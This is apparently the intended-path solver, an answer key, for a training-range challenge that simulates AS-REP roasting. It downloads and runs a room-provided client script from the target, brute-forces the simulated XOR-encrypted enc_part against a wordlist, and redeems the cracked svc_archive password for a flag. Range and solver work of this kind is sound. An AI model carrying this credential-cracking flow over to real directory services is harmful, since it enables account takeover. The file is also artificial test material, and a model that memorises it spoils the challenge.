"""Intended-path solver: list no-preauth accounts, crack the XOR-SIM key, redeem."""

import base64
import hashlib
import re
import subprocess
import sys
import tempfile
from pathlib import Path

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

MAGIC = b"ASREPSIM-V1\x00"
LINE_RE = re.compile(
    r"user:\s*(?P<user>\S+)\s*\n"
    r"\s*cipher:\s*(?P<cipher>\S+)\s*\n"
    r"\s*enc_part:\s*(?P<enc>[A-Za-z0-9+/=]+)"
)


def _crack(enc_part: str, words: list[str]) -> str | None:
    ct = base64.b64decode(enc_part)
    for word in words:
        ks = hashlib.sha256(word.encode()).digest()
        head = bytes(b ^ ks[i % len(ks)] for i, b in enumerate(ct[: len(MAGIC)]))
        if head == MAGIC:
            return word
    return None


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url("target")

    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        script = (httpx.get(f"{base}/tools/getasreproast.py", timeout=10)).text
        words_text = (httpx.get(f"{base}/tools/wordlist.txt", timeout=10)).text
        (tmp_path / "getasreproast.py").write_text(script)
        words = [w for w in words_text.splitlines() if w.strip()]

        # Intended path runs the room-provided stdlib client.
        proc = subprocess.run(  # noqa: S603
            [sys.executable, str(tmp_path / "getasreproast.py"), "--kdc", base],
            capture_output=True,
            text=True,
            timeout=60,
        )
        if proc.returncode != 0:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="crack-the-no-preauth",
                        ok=False,
                        detail=f"getasreproast.py failed: {proc.stderr[:200]}",
                    )
                ]
            )

        cracked: dict[str, str] = {}
        for match in LINE_RE.finditer(proc.stdout):
            password = _crack(match.group("enc"), words)
            if password:
                cracked[match.group("user")] = password

    if "svc_archive" not in cracked:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="crack-the-no-preauth",
                    ok=False,
                    detail=f"svc_archive enc-part did not crack; found {sorted(cracked)}",
                )
            ]
        )

    res = httpx.post(
        f"{base}/redeem",
        json={"username": "svc_archive", "password": cracked["svc_archive"]},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    detail = None
    if not captured:
        detail = f"redeem rejected svc_archive:{cracked['svc_archive']}"
    return SolveResult(
        results=[
            TaskResult(
                task_id="crack-the-no-preauth",
                ok=bool(captured),
                captured=captured,
                detail=detail,
            )
        ]
    )
